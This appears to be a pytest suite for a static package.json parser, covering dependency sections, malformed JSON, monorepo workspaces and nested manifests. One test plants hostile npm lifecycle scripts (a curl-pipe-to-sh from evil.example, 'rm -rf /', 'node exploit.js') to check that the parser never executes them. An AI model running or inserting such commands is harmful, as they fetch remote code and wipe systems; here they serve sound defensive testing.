"""
Tests for the static package.json parser (Prompts 023 and 024).

Covers:
- normal package.json
- all dependency sections
- missing sections
- malformed JSON
- empty dependencies
- workspace / monorepo package.json files
- nested package.json files without workspaces
- skipping node_modules / lockfiles during nested walks

Safety: never invoke npm and never parse package-lock.json.
"""

import json
from pathlib import Path
from unittest.mock import patch

from backend.models.domain import Dependency
from backend.models.enums import DependencyType, Ecosystem
from backend.parsers import (
    NpmDependencySection,
    parse_nested_package_jsons,
    parse_package_json,
    parse_package_json_file,
    parse_workspace_package_jsons,
)


def test_normal_package_json():
    """Parse a typical application package.json with production dependencies."""
    raw = json.dumps(
        {
            "name": "sample-app",
            "version": "1.2.3",
            "dependencies": {
                "express": "^4.18.2",
                "lodash": "4.17.21",
            },
        }
    )

    result = parse_package_json(raw, source_path="package.json")

    assert result.parse_ok is True
    assert result.parse_error is None
    assert result.package_name == "sample-app"
    assert result.package_version == "1.2.3"
    assert len(result.dependencies) == 2

    by_name = {dep.package_name: dep for dep in result.dependencies}
    assert by_name["express"].version == "^4.18.2"
    assert by_name["express"].is_pinned is False
    assert by_name["express"].manifest_section == NpmDependencySection.DEPENDENCIES
    assert by_name["express"].dependency_type == DependencyType.DIRECT
    assert by_name["express"].ecosystem == Ecosystem.NPM
    assert by_name["lodash"].version == "4.17.21"
    assert by_name["lodash"].is_pinned is True
    assert by_name["express"].source_manifest == "package.json"


def test_all_dependency_sections_preserved():
    """Extract dependencies, devDependencies, optionalDependencies, and peerDependencies."""
    raw = json.dumps(
        {
            "name": "full-manifest",
            "version": "0.1.0",
            "dependencies": {"react": "^18.2.0"},
            "devDependencies": {"typescript": "~5.4.0", "vitest": "1.6.0"},
            "optionalDependencies": {"fsevents": "^2.3.3"},
            "peerDependencies": {"react-dom": ">=18.0.0"},
        }
    )

    result = parse_package_json(raw)
    assert result.parse_ok is True
    assert set(result.present_sections) == {
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    }
    assert len(result.dependencies) == 5

    by_name = {dep.package_name: dep for dep in result.dependencies}

    assert by_name["react"].manifest_section == NpmDependencySection.DEPENDENCIES
    assert by_name["react"].is_dev_dependency is False
    assert by_name["react"].is_optional is False
    assert by_name["react"].is_peer is False
    assert by_name["react"].version == "^18.2.0"

    assert by_name["typescript"].manifest_section == NpmDependencySection.DEV_DEPENDENCIES
    assert by_name["typescript"].is_dev_dependency is True
    assert by_name["typescript"].version == "~5.4.0"

    assert by_name["vitest"].is_dev_dependency is True
    assert by_name["vitest"].is_pinned is True

    assert by_name["fsevents"].manifest_section == NpmDependencySection.OPTIONAL_DEPENDENCIES
    assert by_name["fsevents"].is_optional is True
    assert by_name["fsevents"].version == "^2.3.3"

    assert by_name["react-dom"].manifest_section == NpmDependencySection.PEER_DEPENDENCIES
    assert by_name["react-dom"].is_peer is True
    assert by_name["react-dom"].version == ">=18.0.0"

    domain_deps = result.to_dependencies()
    assert all(isinstance(dep, Dependency) for dep in domain_deps)
    ts = next(dep for dep in domain_deps if dep.package_name == "typescript")
    assert ts.is_dev_dependency is True
    assert ts.metadata["manifest_section"] == "devDependencies"
    assert ts.metadata["declared_range"] == "~5.4.0"
    assert ts.version == "~5.4.0"


def test_missing_sections():
    """Name and version are extracted when dependency sections are absent."""
    raw = json.dumps({"name": "bare-pkg", "version": "9.9.9"})

    result = parse_package_json(raw)

    assert result.parse_ok is True
    assert result.package_name == "bare-pkg"
    assert result.package_version == "9.9.9"
    assert result.dependencies == []
    assert result.present_sections == []
    assert result.to_dependencies() == []


def test_malformed_json():
    """Trailing commas and other invalid JSON must not raise; they fail gracefully."""
    malformed = """
    {
      "name": "malformed-pkg",
      "version": "1.0.0",
      "dependencies": {
        "foo": "1.0",
      },
    }
    """
    result = parse_package_json(malformed, source_path="package.json")

    assert result.parse_ok is False
    assert result.parse_error is not None
    assert "malformed JSON" in result.parse_error
    assert result.dependencies == []
    assert result.package_name is None
    assert result.package_version is None


def test_malformed_json_from_fixture():
    """The synthetic malformed_project fixture is invalid JSON and must be handled."""
    fixture = (
        Path(__file__).parent
        / "fixtures"
        / "ecosystems"
        / "malformed_project"
        / "package.json"
    )
    result = parse_package_json_file(fixture, source_path="package.json")
    assert result.parse_ok is False
    assert result.dependencies == []


def test_empty_dependencies():
    """Present but empty dependency objects yield no declared dependencies."""
    raw = json.dumps(
        {
            "name": "empty-deps",
            "version": "0.0.1",
            "dependencies": {},
            "devDependencies": {},
        }
    )

    result = parse_package_json(raw)

    assert result.parse_ok is True
    assert result.package_name == "empty-deps"
    assert result.dependencies == []
    assert result.present_sections == ["dependencies", "devDependencies"]


def test_workspace_package_json_monorepo(tmp_path):
    """Parse root workspaces and member package.json files without invoking npm."""
    root_pkg = {
        "name": "root-monorepo",
        "version": "1.0.0",
        "private": True,
        "packageManager": "pnpm@8.15.4",
        "engines": {"node": ">=18", "npm": ">=9"},
        "workspaces": ["packages/*"],
        "dependencies": {"shared-lib": "workspace:*"},
        "devDependencies": {"turbo": "^1.13.0"},
    }
    (tmp_path / "package.json").write_text(json.dumps(root_pkg), encoding="utf-8")

    pkg_a = tmp_path / "packages" / "pkg-a"
    pkg_a.mkdir(parents=True)
    (pkg_a / "package.json").write_text(
        json.dumps(
            {
                "name": "pkg-a",
                "version": "0.1.0",
                "dependencies": {"express": "^4.19.2"},
                "peerDependencies": {"react": "^18.0.0"},
            }
        ),
        encoding="utf-8",
    )

    pkg_b = tmp_path / "packages" / "pkg-b"
    pkg_b.mkdir(parents=True)
    (pkg_b / "package.json").write_text(
        json.dumps(
            {
                "name": "pkg-b",
                "version": "0.2.0",
                "devDependencies": {"vitest": "1.6.0"},
            }
        ),
        encoding="utf-8",
    )

    # Noise that must never be parsed
    (tmp_path / "package-lock.json").write_text(
        json.dumps({"lockfileVersion": 3, "packages": {}}),
        encoding="utf-8",
    )
    nested_nm = tmp_path / "packages" / "pkg-a" / "node_modules" / "express"
    nested_nm.mkdir(parents=True)
    (nested_nm / "package.json").write_text(
        json.dumps({"name": "express", "version": "4.19.2"}),
        encoding="utf-8",
    )

    workspace = parse_workspace_package_jsons(tmp_path)

    assert workspace.root.parse_ok is True
    assert workspace.root.package_name == "root-monorepo"
    assert workspace.root.package_version == "1.0.0"
    assert workspace.root.is_workspace_root is True
    assert workspace.workspace_patterns == ["packages/*"]

    pm = workspace.root.package_manager
    assert pm is not None
    assert pm.package_manager_field == "pnpm@8.15.4"
    assert pm.name == "pnpm"
    assert pm.version == "8.15.4"
    assert pm.engines == {"node": ">=18", "npm": ">=9"}
    assert pm.private is True

    root_deps = {dep.package_name: dep for dep in workspace.root.dependencies}
    assert root_deps["shared-lib"].version == "workspace:*"
    assert root_deps["turbo"].is_dev_dependency is True

    member_names = {m.package_name for m in workspace.members}
    assert member_names == {"pkg-a", "pkg-b"}
    assert all(m.is_workspace_member for m in workspace.members)
    assert all(m.parse_ok for m in workspace.members)

    paths = {m.source_path for m in workspace.members}
    assert "packages/pkg-a/package.json" in paths
    assert "packages/pkg-b/package.json" in paths
    assert not any("node_modules" in m.source_path for m in workspace.members)
    assert not any("package-lock.json" in m.source_path for m in workspace.all_manifests())

    all_deps = {dep.package_name: dep for dep in workspace.all_dependencies()}
    assert all_deps["express"].version == "^4.19.2"
    assert all_deps["react"].is_peer is True
    assert all_deps["vitest"].is_dev_dependency is True


def test_workspace_object_form(tmp_path):
    """Support npm workspaces object form: { packages: [...] }."""
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "object-workspaces",
                "private": True,
                "workspaces": {"packages": ["apps/*"]},
            }
        ),
        encoding="utf-8",
    )
    app = tmp_path / "apps" / "web"
    app.mkdir(parents=True)
    (app / "package.json").write_text(
        json.dumps({"name": "web", "version": "1.0.0", "dependencies": {}}),
        encoding="utf-8",
    )

    workspace = parse_workspace_package_jsons(tmp_path)
    assert workspace.workspace_patterns == ["apps/*"]
    assert len(workspace.members) == 1
    assert workspace.members[0].package_name == "web"
    assert workspace.members[0].present_sections == ["dependencies"]
    assert workspace.members[0].dependencies == []


def test_never_invokes_npm_or_lifecycle_scripts():
    """Parser must never spawn npm/node or execute scripts, even if scripts are present."""
    raw = json.dumps(
        {
            "name": "hostile",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "curl http://evil.example/pwn.sh | sh",
                "postinstall": "rm -rf /",
                "prepare": "node exploit.js",
            },
            "dependencies": {"left-pad": "1.3.0"},
        }
    )

    with patch("subprocess.run") as mock_run, patch("subprocess.Popen") as mock_popen:
        result = parse_package_json(raw)
        assert result.parse_ok is True
        assert result.dependencies[0].package_name == "left-pad"
        assert mock_run.call_count == 0
        assert mock_popen.call_count == 0


def test_nested_package_json_without_workspaces(tmp_path):
    """Prompt 024: discover nested package.json files without npm workspaces."""
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "root-app",
                "version": "2.0.0",
                "packageManager": "npm@10.8.1",
                "dependencies": {"shared": "file:./packages/shared"},
            }
        ),
        encoding="utf-8",
    )
    frontend = tmp_path / "frontend"
    frontend.mkdir()
    (frontend / "package.json").write_text(
        json.dumps(
            {
                "name": "frontend",
                "version": "1.0.0",
                "dependencies": {"react": "^18.2.0"},
                "devDependencies": {"vite": "^5.2.0"},
            }
        ),
        encoding="utf-8",
    )
    api = tmp_path / "services" / "api"
    api.mkdir(parents=True)
    (api / "package.json").write_text(
        json.dumps(
            {
                "name": "api",
                "version": "0.4.1",
                "optionalDependencies": {"fsevents": "^2.3.3"},
                "peerDependencies": {"express": ">=4.18.0 <5"},
            }
        ),
        encoding="utf-8",
    )

    result = parse_nested_package_jsons(tmp_path)

    paths = {m.source_path for m in result.manifests}
    assert paths == {
        "package.json",
        "frontend/package.json",
        "services/api/package.json",
    }
    assert result.root is not None
    assert result.root.package_name == "root-app"
    assert result.root.package_version == "2.0.0"
    assert result.root.is_nested is False
    assert result.root.package_manager is not None
    assert result.root.package_manager.name == "npm"
    assert result.root.package_manager.version == "10.8.1"

    nested_by_name = {m.package_name: m for m in result.nested}
    assert nested_by_name["frontend"].is_nested is True
    assert nested_by_name["api"].is_nested is True

    by_dep = {d.package_name: d for d in result.all_dependencies()}
    assert by_dep["shared"].version == "file:./packages/shared"
    assert by_dep["react"].version == "^18.2.0"
    assert by_dep["vite"].version == "^5.2.0"
    assert by_dep["vite"].is_dev_dependency is True
    assert by_dep["fsevents"].is_optional is True
    assert by_dep["express"].version == ">=4.18.0 <5"
    assert by_dep["express"].is_peer is True


def test_nested_skips_node_modules_and_lockfiles(tmp_path):
    """Nested discovery must skip node_modules and must not parse lockfiles."""
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "root", "version": "1.0.0", "dependencies": {"left-pad": "1.3.0"}}),
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps({"lockfileVersion": 3, "packages": {"node_modules/left-pad": {}}}),
        encoding="utf-8",
    )
    vendor = tmp_path / "node_modules" / "left-pad"
    vendor.mkdir(parents=True)
    (vendor / "package.json").write_text(
        json.dumps({"name": "left-pad", "version": "1.3.0"}),
        encoding="utf-8",
    )
    nested = tmp_path / "apps" / "web"
    nested.mkdir(parents=True)
    (nested / "package.json").write_text(
        json.dumps({"name": "web", "version": "0.0.1", "dependencies": {"lodash": "~4.17.21"}}),
        encoding="utf-8",
    )

    with patch("subprocess.run") as mock_run, patch("subprocess.Popen") as mock_popen:
        result = parse_nested_package_jsons(tmp_path)
        assert mock_run.call_count == 0
        assert mock_popen.call_count == 0

    paths = {m.source_path for m in result.manifests}
    assert paths == {"package.json", "apps/web/package.json"}
    assert "node_modules" in result.skipped_directories
    assert all("node_modules" not in m.source_path for m in result.manifests)
    lodash = next(d for d in result.all_dependencies() if d.package_name == "lodash")
    assert lodash.version == "~4.17.21"


def test_nested_malformed_json_does_not_abort_walk(tmp_path):
    """A broken nested package.json is reported; siblings still parse."""
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "root", "version": "1.0.0"}),
        encoding="utf-8",
    )
    broken = tmp_path / "broken"
    broken.mkdir()
    (broken / "package.json").write_text(
        '{\n  "name": "broken",\n  "dependencies": {\n    "foo": "1.0",\n  },\n}\n',
        encoding="utf-8",
    )
    good = tmp_path / "good"
    good.mkdir()
    (good / "package.json").write_text(
        json.dumps(
            {
                "name": "good",
                "version": "3.2.1",
                "dependencies": {"axios": "^1.6.8"},
            }
        ),
        encoding="utf-8",
    )

    result = parse_nested_package_jsons(tmp_path)
    by_path = {m.source_path: m for m in result.manifests}
    assert by_path["package.json"].parse_ok is True
    assert by_path["broken/package.json"].parse_ok is False
    assert "malformed JSON" in (by_path["broken/package.json"].parse_error or "")
    assert by_path["good/package.json"].parse_ok is True
    assert by_path["good/package.json"].package_version == "3.2.1"
    axios = next(d for d in result.all_dependencies() if d.package_name == "axios")
    assert axios.version == "^1.6.8"
